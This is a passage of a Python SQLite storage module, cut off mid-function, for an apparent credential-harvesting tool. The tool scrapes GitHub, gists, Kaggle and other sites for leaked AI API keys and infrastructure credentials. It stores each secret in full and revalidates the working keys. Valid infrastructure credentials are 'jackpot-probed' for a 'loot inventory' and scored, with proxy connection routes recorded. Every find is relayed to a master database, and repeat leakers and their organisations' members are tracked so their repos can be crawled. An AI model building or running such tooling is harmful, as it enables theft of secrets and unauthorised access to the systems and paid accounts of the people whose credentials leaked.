import sqlite3
import hashlib
from datetime import datetime, timezone, timedelta
from config import DB_PATH, REPO_RESCAN_DAYS


def _conn():
    c = sqlite3.connect(DB_PATH, check_same_thread=False)
    c.row_factory = sqlite3.Row
    # WAL mode: multiple concurrent readers + serialized writers — critical for
    # N parallel workers all writing to same DB
    c.execute("PRAGMA journal_mode=WAL")
    c.execute("PRAGMA synchronous=NORMAL")   # safe + fast with WAL
    c.execute("PRAGMA cache_size=-32000")    # 32MB page cache
    c.execute("PRAGMA temp_store=MEMORY")
    return c


def init_db():
    with _conn() as c:
        c.executescript("""
        PRAGMA journal_mode=WAL;
        PRAGMA synchronous=NORMAL;

        CREATE TABLE IF NOT EXISTS scanned_files (
            sha TEXT PRIMARY KEY,
            scanned_at TEXT NOT NULL
        );
        -- Kaggle notebooks scanned (separate from scanned_files since
        -- that table uses sha256 hashes — we want a clean count of
        -- unique notebook refs processed, displayable in TG digest).
        CREATE TABLE IF NOT EXISTS kaggle_kernels_scanned (
            ref TEXT PRIMARY KEY,
            scanned_at TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS scanned_repos (
            full_name TEXT PRIMARY KEY,
            first_seen TEXT NOT NULL,
            last_scanned TEXT NOT NULL,
            stars INTEGER DEFAULT 0,
            created_at TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS found_keys (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            key_hash TEXT UNIQUE NOT NULL,
            provider TEXT NOT NULL,
            key_preview TEXT NOT NULL,
            key_full TEXT NOT NULL,
            repo TEXT NOT NULL,
            file_path TEXT NOT NULL,
            file_url TEXT NOT NULL,
            repo_stars INTEGER DEFAULT 0,
            repo_created TEXT DEFAULT '',
            file_type TEXT DEFAULT '',
            is_valid INTEGER DEFAULT 0,
            discovered_at TEXT NOT NULL
        );
        CREATE INDEX IF NOT EXISTS idx_found_valid    ON found_keys(is_valid, discovered_at DESC);
        CREATE INDEX IF NOT EXISTS idx_found_provider ON found_keys(provider, discovered_at DESC);
        CREATE INDEX IF NOT EXISTS idx_found_at       ON found_keys(discovered_at DESC);

        -- Infrastructure credentials: DB connection strings, SSH keys, cloud keys, deploy tokens.
        -- Separate table from found_keys (AI provider keys) so we can query/display them
        -- independently and apply different logic (risk assessment, destination logging).
        CREATE TABLE IF NOT EXISTS infra_findings (
            id            INTEGER PRIMARY KEY AUTOINCREMENT,
            cred_hash     TEXT UNIQUE NOT NULL,
            cred_type     TEXT NOT NULL,        -- database/ssh/aws/alibaba/azure/infra
            cred_preview  TEXT NOT NULL,        -- first 20 + last 8 chars
            cred_full     TEXT NOT NULL,        -- full credential (connection string / key)
            repo          TEXT NOT NULL,
            file_path     TEXT NOT NULL,
            file_url      TEXT NOT NULL,
            repo_stars    INTEGER DEFAULT 0,
            repo_created  TEXT DEFAULT '',
            file_type     TEXT DEFAULT '',      -- env/cicd/docker/helm/terraform/ansible/code
            destination   TEXT DEFAULT '',      -- extracted host from DSN (where this connects)
            risk_level    TEXT DEFAULT 'low',   -- high / medium / low
            risk_reasons  TEXT DEFAULT '',      -- JSON array of contributing factors
            discovered_at TEXT NOT NULL
        );
        CREATE INDEX IF NOT EXISTS idx_infra_type     ON infra_findings(cred_type, discovered_at DESC);
        CREATE INDEX IF NOT EXISTS idx_infra_risk     ON infra_findings(risk_level, discovered_at DESC);
        CREATE INDEX IF NOT EXISTS idx_infra_dest     ON infra_findings(destination);
        CREATE INDEX IF NOT EXISTS idx_infra_at       ON infra_findings(discovered_at DESC);

        -- Author tracking — serial leaker watchlist.
        -- Auto-populated by track_leak() on every save_key insert. Promotes
        -- to is_watched=1 once leak_count >= 3 (deliberate threshold —
        -- 1-2 leaks is noise, 3+ is a habit). Watched authors get their
        -- public repos walked periodically to capture future leaks within
        -- hours rather than days.
        CREATE TABLE IF NOT EXISTS watched_authors (
            login            TEXT NOT NULL,
            platform         TEXT NOT NULL DEFAULT 'github',
            leak_count       INTEGER DEFAULT 0,
            valid_count      INTEGER DEFAULT 0,
            repos_with_leaks INTEGER DEFAULT 0,
            first_leak_at    TEXT NOT NULL,
            last_leak_at     TEXT NOT NULL,
            last_walked_at   TEXT,
            is_watched       INTEGER DEFAULT 0,
            PRIMARY KEY(login, platform)
        );
        CREATE INDEX IF NOT EXISTS idx_authors_count   ON watched_authors(leak_count DESC);
        CREATE INDEX IF NOT EXISTS idx_authors_watched ON watched_authors(is_watched, last_leak_at DESC);
        CREATE INDEX IF NOT EXISTS idx_authors_walk    ON watched_authors(is_watched, last_walked_at);

        -- Tree-walk dedup — repos already exhaustively scanned.
        -- Prevents re-walking when subsequent keys are found in the same repo.
        CREATE TABLE IF NOT EXISTS tree_walked_repos (
            repo_full_name TEXT PRIMARY KEY,
            walked_at      TEXT NOT NULL,
            files_scanned  INTEGER DEFAULT 0,
            keys_found     INTEGER DEFAULT 0
        );
        CREATE INDEX IF NOT EXISTS idx_treewalk_at ON tree_walked_repos(walked_at DESC);

        -- Org members walk dedup — orgs whose member list was already
        -- enumerated. Prevents re-walking when multiple authors from the
        -- same org get promoted to watched. members_walked counts how many
        -- new author entries the walk inserted.
        CREATE TABLE IF NOT EXISTS walked_orgs (
            org             TEXT PRIMARY KEY,
            walked_at       TEXT NOT NULL,
            members_listed  INTEGER DEFAULT 0,
            members_new     INTEGER DEFAULT 0
        );
        CREATE INDEX IF NOT EXISTS idx_walked_orgs_at ON walked_orgs(walked_at DESC);

        -- Gist walk dedup — per-author last gist-walk timestamp.
        -- author-level granular dedup of walked gists is via
        -- scanned_files (the SHA of the gist file content).
        CREATE TABLE IF NOT EXISTS walked_gists_authors (
            login           TEXT PRIMARY KEY,
            walked_at       TEXT NOT NULL,
            gists_listed    INTEGER DEFAULT 0,
            files_scanned   INTEGER DEFAULT 0,
            keys_found      INTEGER DEFAULT 0
        );
        CREATE INDEX IF NOT EXISTS idx_walked_gists_at ON walked_gists_authors(walked_at DESC);

        -- Dynamic AI/combinatorial queries — rotating pool generated every 8h.
        -- 15-day non-repeat is enforced at insert time via query_hash dedup.
        -- Per-query yield is tracked so the generator can prioritize productive
        -- patterns and blacklist mutational dead-ends.
        CREATE TABLE IF NOT EXISTS dynamic_queries (
            query_hash        TEXT PRIMARY KEY,
            query_str         TEXT NOT NULL,
            provider          TEXT NOT NULL,
            file_type         TEXT NOT NULL,
            theme             TEXT DEFAULT '',
            generated_at      TEXT NOT NULL,
            last_used_at      TEXT,
            times_used        INTEGER DEFAULT 0,
            items_returned    INTEGER DEFAULT 0,
            keys_found        INTEGER DEFAULT 0,
            valid_keys_found  INTEGER DEFAULT 0,
            blacklisted_until TEXT
        );
        CREATE INDEX IF NOT EXISTS idx_dq_provider_gen ON dynamic_queries(provider, generated_at DESC);
        CREATE INDEX IF NOT EXISTS idx_dq_yield        ON dynamic_queries(valid_keys_found DESC, keys_found DESC);
        CREATE INDEX IF NOT EXISTS idx_dq_active       ON dynamic_queries(blacklisted_until, generated_at DESC);

        -- Kaggle-specific dynamic queries (LLM-generated, kept separate from
        -- GitHub dynamic_queries because Kaggle search syntax differs:
        -- no filename:/language:/path: operators, only free-text relevance).
        -- Same yield-tracking pattern → kaggle_themer can prioritize what works.
        CREATE TABLE IF NOT EXISTS kaggle_dynamic_queries (
            query_hash        TEXT PRIMARY KEY,
            query_str         TEXT NOT NULL,
            theme             TEXT DEFAULT '',
            generated_at      TEXT NOT NULL,
            last_used_at      TEXT,
            times_used        INTEGER DEFAULT 0,
            kernels_returned  INTEGER DEFAULT 0,
            keys_found        INTEGER DEFAULT 0,
            valid_keys_found  INTEGER DEFAULT 0,
            blacklisted_until TEXT
        );
        CREATE INDEX IF NOT EXISTS idx_kdq_yield  ON kaggle_dynamic_queries(valid_keys_found DESC, keys_found DESC);
        CREATE INDEX IF NOT EXISTS idx_kdq_active ON kaggle_dynamic_queries(blacklisted_until, generated_at DESC);

        -- Axis extensions discovered by the AI vocabulary expander.
        -- The combinatorial generator merges these on top of the static
        -- PROVIDER_AXES dict in query_axes.py — so DeepSeek-discovered names
        -- enter rotation on the next generator cycle without code changes.
        CREATE TABLE IF NOT EXISTS axis_extensions (
            id            INTEGER PRIMARY KEY AUTOINCREMENT,
            provider      TEXT NOT NULL,
            axis          TEXT NOT NULL,
            value         TEXT NOT NULL,
            discovered_at TEXT NOT NULL,
            times_used    INTEGER DEFAULT 0,
            keys_found    INTEGER DEFAULT 0,
            UNIQUE(provider, axis, value)
        );
        CREATE INDEX IF NOT EXISTS idx_axis_prov ON axis_extensions(provider, axis);
        """)
        # Migrations — add columns if they don't exist yet (idempotent)
        for col, defn in [
            ("is_validated",     "INTEGER DEFAULT -1"),   # -1=pending, 0=invalid, 1=valid
            ("validation_result", "TEXT DEFAULT ''"),
        ]:
            try:
                c.execute(f"ALTER TABLE infra_findings ADD COLUMN {col} {defn}")
            except Exception:
                pass  # already exists
        # found_keys migrations
        for col, defn in [
            ("last_validated_at", "TEXT DEFAULT NULL"),  # last re-validation timestamp
        ]:
            try:
                c.execute(f"ALTER TABLE found_keys ADD COLUMN {col} {defn}")
            except Exception:
                pass
        # infra_findings migrations
        for col, defn in [
            ("jackpot_data",  "TEXT DEFAULT NULL"),   # JSON: per-probe loot inventory
            ("jackpot_score", "INTEGER DEFAULT 0"),   # 0-100, set by /admin/jackpot_probe
            ("connect_route", "TEXT DEFAULT ''"),     # 'direct' | 'proxy:US' | 'proxy:DE' etc
        ]:
            try:
                c.execute(f"ALTER TABLE infra_findings ADD COLUMN {col} {defn}")
            except Exception:
                pass


def _now():
    return datetime.now(timezone.utc).isoformat()


# ── Files ──────────────────────────────────────────────────────────────────

def try_claim_file(sha: str) -> bool:
    """
    Atomically claim a file SHA for processing.
    Returns True  → this caller is the first to see it (go ahead and process).
    Returns False → already claimed by another worker (skip, no race).

    Replaces the old is_file_scanned() + mark_file_scanned() two-step which
    had a TOCTOU race: two parallel workers could both read False, both proceed
    to fetch/validate the same file, wasting an HTTP round-trip.
    SQLite INSERT OR IGNORE is atomic — rowcount=1 means "I inserted it first".
    """
    with _conn() as c:
        cur = c.execute(
            "INSERT OR IGNORE INTO scanned_files(sha, scanned_at) VALUES(?,?)",
            (sha, _now()),
        )
        return cur.rowcount == 1  # 1 = new insert (claim granted), 0 = already existed


def clear_scanned_files() -> int:
    """Delete all rows from scanned_files. Returns count of deleted rows."""
    with _conn() as c:
        cnt = c.execute("SELECT COUNT(*) FROM scanned_files").fetchone()[0]
        c.execute("DELETE FROM scanned_files")
        return cnt


def kaggle_mark_scanned(ref: str) -> bool:
    """Atomically claim a Kaggle kernel ref for processing. Returns True on
    new claim, False if already scanned. Distinct table from scanned_files
    so we can count unique kernels without sha256 hash obfuscation."""
    with _conn() as c:
        cur = c.execute(
            "INSERT OR IGNORE INTO kaggle_kernels_scanned(ref, scanned_at) VALUES(?,?)",
            (ref, _now()),
        )
        return cur.rowcount == 1


# kept for backward compat with any external callers
def is_file_scanned(sha: str) -> bool:
    with _conn() as c:
        return c.execute("SELECT 1 FROM scanned_files WHERE sha=?", (sha,)).fetchone() is not None


def mark_file_scanned(sha: str):
    with _conn() as c:
        c.execute("INSERT OR IGNORE INTO scanned_files(sha, scanned_at) VALUES(?,?)", (sha, _now()))


# ── Repos ──────────────────────────────────────────────────────────────────

def should_scan_repo(full_name: str) -> bool:
    with _conn() as c:
        row = c.execute("SELECT last_scanned FROM scanned_repos WHERE full_name=?",
                        (full_name,)).fetchone()
    if row is None:
        return True
    last = datetime.fromisoformat(row["last_scanned"])
    return (datetime.now(timezone.utc) - last) > timedelta(days=REPO_RESCAN_DAYS)


def mark_repo_scanned(full_name: str, stars: int = 0, created_at: str = ""):
    now = _now()
    with _conn() as c:
        c.execute("""
            INSERT INTO scanned_repos(full_name, first_seen, last_scanned, stars, created_at)
            VALUES(?, ?, ?, ?, ?)
            ON CONFLICT(full_name) DO UPDATE SET
                last_scanned=excluded.last_scanned,
                stars=excluded.stars,
                created_at=excluded.created_at
        """, (full_name, now, now, stars, created_at))


def get_repo_cached(full_name: str) -> tuple[int, str] | None:
    with _conn() as c:
        row = c.execute("SELECT stars, created_at FROM scanned_repos WHERE full_name=?",
                        (full_name,)).fetchone()
    return (row["stars"], row["created_at"]) if row else None


# ── Keys ───────────────────────────────────────────────────────────────────

def key_exists(key: str) -> bool:
    h = hashlib.sha256(key.encode()).hexdigest()
    with _conn() as c:
        return c.execute("SELECT 1 FROM found_keys WHERE key_hash=?", (h,)).fetchone() is not None


def save_key(provider: str, key: str, repo: str, file_path: str,
             file_url: str, repo_stars: int, repo_created: str,
             file_type: str, is_valid: bool) -> bool:
    h = hashlib.sha256(key.encode()).hexdigest()
    preview = key[:12] + "..." + key[-6:] if len(key) > 18 else key[:8] + "..."
    try:
        with _conn() as c:
            c.execute("""
                INSERT INTO found_keys
                    (key_hash, provider, key_preview, key_full, repo,
                     file_path, file_url, repo_stars, repo_created,
                     file_type, is_valid, discovered_at)
                VALUES(?,?,?,?,?,?,?,?,?,?,?,?)
            """, (h, provider, preview, key, repo, file_path, file_url,
                  repo_stars, repo_created, file_type, int(is_valid), _now()))
        # Track author leak (best-effort — never raise on tracking failure)
        try:
            track_leak(repo, bool(is_valid))
        except Exception:
            pass
        # Mirror mode: relay this find to master DB. No-op if MIRROR_MODE=0.
        # Import lazily to avoid circular config dependency at module load.
        try:
            from mirror_relay import enqueue_ai_find as _mirror_ai
            _mirror_ai(provider, key, repo, file_path, file_url)
        except Exception:
            pass
        return True
    except sqlite3.IntegrityError:
        return False


# ── Author tracking (serial leaker watchlist) ─────────────────────────────────

# leak_count threshold above which an author is auto-promoted to is_watched=1.
# Conservative: 1-2 leaks is noise (one-off accident), 3+ is a habit.
_WATCHLIST_THRESHOLD = 3


# GitHub username shape: alphanumeric + hyphens, can't start/end with hyphen,
# max 39 chars. We're permissive (allow up to 60) so foreign platforms with
# longer login names also pass — but the negative shape rules below catch the
# obvious garbage like 'https:' from URL-style repo strings.
import re as _re_db
_VALID_LOGIN = _re_db.compile(r'^[A-Za-z0-9](?:[A-Za-z0-9_\-\.]{0,58}[A-Za-z0-9])?$')


def _parse_repo(repo: str) -> tuple[str, str]:
    """Parse `owner/name` from various scanner repo formats.

    Handles plain GitHub `owner/name`, gitee/codeberg/bitbucket which all use
    the same format, plus prefixed variants like `postman:ws_name` or
    `kaggle:owner/slug`. Returns (platform, login). Empty login = skip
    (caller treats empty as "don't track").

    Defensive: rejects URL-style repo strings (`https://...`,
    `http://...`) that surfaced as login='https:' in watched_authors.
    Also rejects logins that fail GitHub's shape rules — those would never
    correspond to a real account and pollute the watchlist.
    """
    if not repo:
        return ("github", "")
    # Stripped prefixes for non-github platforms
    for pfx, plat in (
        ("postman:",  "postman"),
        ("kaggle:",   "kaggle"),
        ("hf:",       "huggingface"),
        ("npm:",      "npm"),
        ("pypi:",     "pypi"),
        ("cc:",       "commoncrawl"),
    ):
        if repo.startswith(pfx):
            rest = repo[len(pfx):]
            login = rest.split("/", 1)[0] if "/" in rest else rest
            login = login.strip()
            if not _VALID_LOGIN.match(login):
                return (plat, "")
            return (plat, login)

    # Reject URL-style strings BEFORE generic split — `https://x/y`.split("/")
    # would otherwise yield login='https:' which then poisons watched_authors.
    if "://" in repo or repo.lower().startswith(("http:", "https:")):
        return ("github", "")

    # Default: assume `owner/name` GitHub-shape (also valid for gitee/codeberg)
    parts = repo.split("/", 1)
    if len(parts) != 2 or not parts[0]:
        return ("github", "")
    login = parts[0].strip()
    if not _VALID_LOGIN.match(login):
        return ("github", "")
    return ("github", login)


def track_leak(repo: str, is_valid: bool):
    """Auto-populate watched_authors on every save_key. UPSERT pattern:
    increment counters and bump timestamps for the leak's author.
    Promotes to is_watched=1 once leak_count >= threshold."""
    platform, login = _parse_repo(repo)
    if not login:
        return
    now = _now()
    with _conn() as c:
        # First check if owner already had a leak in this exact repo
        # (so repos_with_leaks counts unique repos, not unique keys).
        prior = c.execute(
            "SELECT 1 FROM found_keys WHERE repo=? LIMIT 1",
            (repo,),
        ).fetchone()
        # `prior` reflects the just-inserted row too, so compare counts:
        # if there's exactly 1 row for this repo, this leak introduces a
        # new repo; otherwise the repo already counted previously.
        prior_count = c.execute(
            "SELECT COUNT(*) FROM found_keys WHERE repo=?",
            (repo,),
        ).fetchone()[0]
        first_in_repo = (prior_count == 1)

        c.execute("""
            INSERT INTO watched_authors
                (login, platform, leak_count, valid_count, repos_with_leaks,
                 first_leak_at, last_leak_at, is_watched)
            VALUES (?, ?, 1, ?, 1, ?, ?, 0)
            ON CONFLICT(login, platform) DO UPDATE SET
                leak_count       = leak_count + 1,
                valid_count      = valid_count + ?,
                repos_with_leaks = repos_with_leaks + ?,
                last_leak_at     = excluded.last_leak_at,
                is_watched       = CASE WHEN leak_count + 1 >= ?
                                        THEN 1 ELSE is_watched END
        """, (
            login, platform,
            1 if is_valid else 0,
            now, now,
            1 if is_valid else 0,
            1 if first_in_repo else 0,
            _WATCHLIST_THRESHOLD,
        ))


def get_watched_authors(limit: int = 100, only_watched: bool = True) -> list[dict]:
    """Top leakers ranked by leak_count (or valid_count if available)."""
    where = "WHERE is_watched=1" if only_watched else ""
    with _conn() as c:
        return [dict(r) for r in c.execute(
            f"""SELECT login, platform, leak_count, valid_count,
                       repos_with_leaks, first_leak_at, last_leak_at,
                       last_walked_at, is_watched
                FROM watched_authors
                {where}
                ORDER BY valid_count DESC, leak_count DESC
                LIMIT ?""",
            (limit,),
        ).fetchall()]


def get_authors_to_walk(limit: int = 20, max_age_hours: int = 24) -> list[dict]:
    """Watched authors whose last_walked_at is older than max_age_hours.
    NULLs (never walked) come first."""
    cutoff = (datetime.now(timezone.utc) - timedelta(hours=max_age_hours)).isoformat()
    with _conn() as c:
        return [dict(r) for r in c.execute(
            """SELECT login, platform, leak_count, last_walked_at
               FROM watched_authors
               WHERE is_watched=1
                 AND (last_walked_at IS NULL OR last_walked_at < ?)
               ORDER BY
                 CASE WHEN last_walked_at IS NULL THEN 0 ELSE 1 END,
                 leak_count DESC,
                 last_walked_at ASC
               LIMIT ?""",
            (cutoff, limit),
        ).fetchall()]


def mark_author_walked(login: str, platform: str = "github"):
    """Stamp last_walked_at after a successful repo enumeration."""
    with _conn() as c:
        c.execute(
            "UPDATE watched_authors SET last_walked_at=? WHERE login=? AND platform=?",
            (_now(), login, platform),
        )


def is_author_watched(login: str, platform: str = "github") -> bool:
    """Returns True if author is currently in the watchlist (is_watched=1).
    Used by walk_org_members to skip already-watched coworkers."""
    with _conn() as c:
        row = c.execute(
            "SELECT is_watched FROM watched_authors WHERE login = ? AND platform = ?",
            (login, platform),
        ).fetchone()
    return bool(row) and bool(row["is_watched"])


# ── Tree-walk dedup ────────────────────────────────────────────────────────────

def try_claim_repo_tree(repo_full_name: str) -> bool:
    """Atomic claim: True if this repo hasn't been tree-walked yet.

    Inserting a placeholder row first prevents two concurrent workers from
    both walking the same repo. The `walked_at` is overwritten by
    mark_repo_walked on completion.
    """
    if not repo_full_name:
        return False
    try:
        with _conn() as c:
            c.execute(
                "INSERT INTO tree_walked_repos (repo_full_name, walked_at) VALUES(?, ?)",
                (repo_full_name, _now()),
            )
        return True
    except sqlite3.IntegrityError:
        return False


def mark_repo_walked(repo_full_name: str, files_scanned: int, keys_found: int):
    """Update stats on a tree-walked repo (placeholder row already exists
    via try_claim_repo_tree)."""
    with _conn() as c:
        c.execute(
            """UPDATE tree_walked_repos
               SET walked_at=?, files_scanned=?, keys_found=?
               WHERE repo_full_name=?""",
            (_now(), files_scanned, keys_found, repo_full_name),
        )


def try_claim_org_walk(org: str, max_age_hours: int = 24 * 7) -> bool:
    """Atomic claim-or-skip for org-member walks. Returns True if THIS caller
    is the first to walk this org within max_age_hours window — caller should
    proceed to enumerate org members. Returns False if recently walked.

    Default 7 days: org membership rarely changes faster than that, no point
    re-walking sooner. Caller updates stats via mark_org_walked() after.
    """
    from datetime import datetime, timezone, timedelta
    cutoff = (datetime.now(timezone.utc) - timedelta(hours=max_age_hours)).isoformat()
    now = _now()
    with _conn() as c:
        # If recent row exists → skip
        row = c.execute(
            "SELECT walked_at FROM walked_orgs WHERE org = ?", (org,)
        ).fetchone()
        if row and row["walked_at"] >= cutoff:
            return False
        # Upsert: claim this org for current cycle
        c.execute(
            """INSERT INTO walked_orgs(org, walked_at, members_listed, members_new)
               VALUES(?, ?, 0, 0)
               ON CONFLICT(org) DO UPDATE SET walked_at=excluded.walked_at""",
            (org, now),
        )
    return True


def mark_org_walked(org: str, members_listed: int, members_new: int):
    """Update stats after walk_org_members() completes."""
    with _conn() as c:
        c.execute(
            """UPDATE walked_orgs
               SET walked_at=?, members_listed=?, members_new=?
               WHERE org=?""",
            (_now(), members_listed, members_new, org),
        )


def try_claim_gist_walk(login: str, max_age_hours: int = 24) -> bool:
    """Atomic claim-or-skip for per-author gist walks. Returns True if not
    walked within max_age_hours."""
    from datetime import datetime, timezone, timedelta
    cutoff = (datetime.now(timezone.utc) - timedelta(hours=max_age_hours)).isoformat()
    now = _now()
    with _conn() as c:
        row = c.execute(
            "SELECT walked_at FROM walked_gists_authors WHERE login = ?", (login,)
        ).fetchone()
        if row and row["walked_at"] >= cutoff:
            return False
        c.execute(
            """INSERT INTO walked_gists_authors(login, walked_at, gists_listed, files_scanned, keys_found)
               VALUES(?, ?, 0, 0, 0)
               ON CONFLICT(login) DO UPDATE SET walked_at=excluded.walked_at""",
            (login, now),
        )
    return True


def mark_gist_walk(login: str, gists_listed: int, files_scanned: int,
                    keys_found: int):
    """Stats update after walk_user_gists() completes."""
    with _conn() as c:
        c.execute(
            """UPDATE walked_gists_authors
               SET walked_at=?, gists_listed=?, files_scanned=?, keys_found=?
               WHERE login=?""",
            (_now(), gists_listed, files_scanned, keys_found, login),
        )


def update_key_validity(key_hash: str, is_valid: bool):
    """Update is_valid and stamp last_validated_at. Called by revalidation loop."""
    with _conn() as c:
        c.execute(
            "UPDATE found_keys SET is_valid=?, last_validated_at=? WHERE key_hash=?",
            (int(is_valid), _now(), key_hash),
        )


def update_key_provider(key_hash: str, provider: str):
    """Reclassify an existing key to a new provider label (e.g. ark → ark_fast)."""
    with _conn() as c:
        c.execute(
            "UPDATE found_keys SET provider=? WHERE key_hash=?",
            (provider, key_hash),
        )


def get_valid_keys_by_provider(provider: str) -> list[dict]:
    """Return all is_valid=1 keys for a given provider."""
    with _conn() as c:
        return [dict(r) for r in c.execute(
            "SELECT id, key_hash, provider, key_full, key_preview, repo, file_url "
            "FROM found_keys WHERE is_valid=1 AND provider=?",
            (provider,),
        ).fetchall()]


def get_valid_count_by_provider() -> dict[str, int]:
    """Return {provider: count} for all is_valid=1 keys."""
    with _conn() as c:
        rows = c.execute(
            "SELECT provider, COUNT(*) as cnt FROM found_keys WHERE is_valid=1 GROUP BY provider"
        ).fetchall()
    return {row["provider"]: row["cnt"] for row in rows}


def get_valid_keys_to_revalidate(max_age_hours: int = 12, limit: int = 200) -> list[dict]:
    """
    Return up to `limit` keys currently marked valid that haven't been
    re-validated within `max_age_hours`. NULLs (never re-validated) come first.
    """
    cutoff = (datetime.now(timezone.utc) - timedelta(hours=max_age_hours)).isoformat()
    with _conn() as c:
        return [dict(r) for r in c.execute(
            """SELECT id, key_hash, provider, key_full FROM found_keys
               WHERE is_valid=1
                 AND (last_validated_at IS NULL OR last_validated_at < ?)
               ORDER BY
                 CASE WHEN last_validated_at IS NULL THEN 0 ELSE 1 END,
                 last_validated_at ASC
               LIMIT ?""",
            (cutoff, limit),
        ).fetchall()]


# ── Stats / Results ────────────────────────────────────────────────────────

def get_stats() -> dict:
    with _conn() as c:
        by_prov = [dict(r) for r in c.execute(
            "SELECT provider, COUNT(*) as total, COALESCE(SUM(is_valid),0) as valid "
            "FROM found_keys GROUP BY provider ORDER BY total DESC"
        ).fetchall()]
        kaggle_scanned = c.execute("SELECT COUNT(*) FROM kaggle_kernels_scanned").fetchone()[0]
        kaggle_found   = c.execute("SELECT COUNT(*) FROM found_keys WHERE file_type='kaggle'").fetchone()[0]
        kaggle_valid   = c.execute("SELECT COALESCE(SUM(is_valid),0) FROM found_keys WHERE file_type='kaggle'").fetchone()[0]
        return {
            "repos_scanned":   c.execute("SELECT COUNT(*) FROM scanned_repos").fetchone()[0],
            "files_scanned":   c.execute("SELECT COUNT(*) FROM scanned_files").fetchone()[0],
            "keys_found":      c.execute("SELECT COUNT(*) FROM found_keys").fetchone()[0],
            "keys_valid":      c.execute("SELECT COUNT(*) FROM found_keys WHERE is_valid=1").fetchone()[0],
            "by_provider":     by_prov,
            "kaggle_scanned":  kaggle_scanned,
            "kaggle_found":    kaggle_found,
            "kaggle_valid":    kaggle_valid,
        }


def get_keys_since(since_iso: str) -> list[dict]:
    with _conn() as c:
        return [dict(r) for r in c.execute(
            "SELECT provider, COUNT(*) as cnt, COALESCE(SUM(is_valid),0) as valid_cnt "
            "FROM found_keys WHERE discovered_at > ? "
            "GROUP BY provider ORDER BY cnt DESC",
            (since_iso,)
        ).fetchall()]


def get_valid_since(since_iso: str) -> list[dict]:
    with _conn() as c:
        return [dict(r) for r in c.execute(
            "SELECT provider, key_preview, repo, file_url, discovered_at "
            "FROM found_keys WHERE is_valid=1 AND discovered_at > ? "
            "ORDER BY discovered_at DESC LIMIT 10",
            (since_iso,)
        ).fetchall()]


def get_results(valid_only: bool = False, limit: int = 200) -> list[dict]:
    if valid_only:
        q = "SELECT * FROM found_keys WHERE is_valid=1 ORDER BY discovered_at DESC LIMIT ?"
    else:
        q = "SELECT * FROM found_keys ORDER BY discovered_at DESC LIMIT ?"
    with _conn() as c:
        return [dict(r) for r in c.execute(q, (limit,)).fetchall()]


# ── Infra findings ──────────────────────────────────────────────────────────

def infra_exists(cred: str) -> bool:
    h = hashlib.sha256(cred.encode()).hexdigest()
    with _conn() as c:
        return c.execute("SELECT 1 FROM infra_findings WHERE cred_hash=?",
                         (h,)).fetchone() is not None


def save_infra(cred_type: str, cred: str, repo: str, file_path: str,
               file_url: str, repo_stars: int, repo_created: str,
               file_type: str, destination: str,
               risk_level: str, risk_reasons: list[str]) -> bool:
    import json
    h = hashlib.sha256(cred.encode()).hexdigest()
    # Preview: first 20 + last 8, never expose DB passwords/SSH keys in full in preview
    preview = cred[:20] + "..." + cred[-8:] if len(cred) > 28 else cred[:16] + "..."
    try:
        with _conn() as c:
            c.execute("""
                INSERT INTO infra_findings
                    (cred_hash, cred_type, cred_preview, cred_full, repo,
                     file_path, file_url, repo_stars, repo_created,
                     file_type, destination, risk_level, risk_reasons, discovered_at)
                VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)
            """, (h, cred_type, preview, cred, repo, file_path, file_url,
                  repo_stars, repo_created, file_type, destination,
                  risk_level, json.dumps(risk_reasons, ensure_ascii=False), _now()))
        # Mirror mode: relay infra find to master.
        try:
            from mirror_relay import enqueue_infra_find as _mirror_infra
            _mirror_infra(cred_type, cred, repo, file_path, file_url,
                          destination, risk_level)
        except Exception:
            pass
        return True
    except sqlite3.IntegrityError:
        return False


def get_infra_results(risk_filter: str | None = None, limit: int = 200,
                       sort: str = "score") -> list[dict]:
    """risk_filter: 'critical' | 'high' | 'medium' | 'low' | None (all)
    sort: 'score' (jackpot_score DESC then discovered_at DESC)
        | 'recent' (discovered_at DESC)"""
    order = (
        "jackpot_score DESC, discovered_at DESC"
        if sort == "score" else
        "discovered_at DESC"
    )
    if risk_filter:
        q = f"SELECT * FROM infra_findings WHERE risk_level=? ORDER BY {order} LIMIT ?"
        with _conn() as c:
            return [dict(r) for r in c.execute(q, (risk_filter, limit)).fetchall()]
    q = f"SELECT * FROM infra_findings ORDER BY {order} LIMIT ?"
    with _conn() as c:
        return [dict(r) for r in c.execute(q, (limit,)).fetchall()]


def get_infra_stats() -> dict:
    with _conn() as c:
        by_type = [dict(r) for r in c.execute(
            "SELECT cred_type, COUNT(*) as total, "
            "SUM(CASE WHEN risk_level='high' THEN 1 ELSE 0 END) as high_risk, "
            "SUM(CASE WHEN risk_level='medium' THEN 1 ELSE 0 END) as med_risk "
            "FROM infra_findings GROUP BY cred_type ORDER BY total DESC"
        ).fetchall()]
        by_dest = [dict(r) for r in c.execute(
            "SELECT destination, COUNT(*) as cnt, cred_type "
            "FROM infra_findings WHERE destination != '' "
            "GROUP BY destination ORDER BY cnt DESC LIMIT 20"
        ).fetchall()]
        return {
            "total":   c.execute("SELECT COUNT(*) FROM infra_findings").fetchone()[0],
            "high":    c.execute("SELECT COUNT(*) FROM infra_findings WHERE risk_level='high'").fetchone()[0],
            "medium":  c.execute("SELECT COUNT(*) FROM infra_findings WHERE risk_level='medium'").fetchone()[0],
            "by_type": by_type,
            "by_dest": by_dest,
        }


def update_infra_validation(cred_hash: str, is_validated: int, result: str = ""):
    with _conn() as c:
        c.execute(
            "UPDATE infra_findings SET is_validated=?, validation_result=? WHERE cred_hash=?",
            (is_validated, result, cred_hash),
        )


def get_unprobed_validated_infra(limit: int = 50) -> list[dict]:
    """Validated infra rows that haven't been jackpot-probed yet.
    Used by the periodic auto-jackpot loop in main.py to catch new
    valid creds without waiting for manual /admin/jackpot_probe.
    Excludes rows whose previous probe errored (we don't infinite-retry)."""
    with _conn() as c:
        return [dict(r) for r in c.execute(
            "SELECT id, cred_type, cred_full, repo, file_path, file_url, "
            "repo_stars, repo_created "
            "FROM infra_findings "
            "WHERE is_validated=1 "
            "  AND (jackpot_data IS NULL OR jackpot_data='') "
            "ORDER BY id DESC "
            "LIMIT ?",
            (limit,),
        ).fetchall()]


def cleanup_old_low_risk(older_than_days: int = 30) -> int:
    """Delete low-risk infra findings older than N days. Returns deleted count."""
    cutoff = (datetime.now(timezone.utc) - timedelta(days=older_than_days)).isoformat()
    with _conn() as c:
        cur = c.execute(
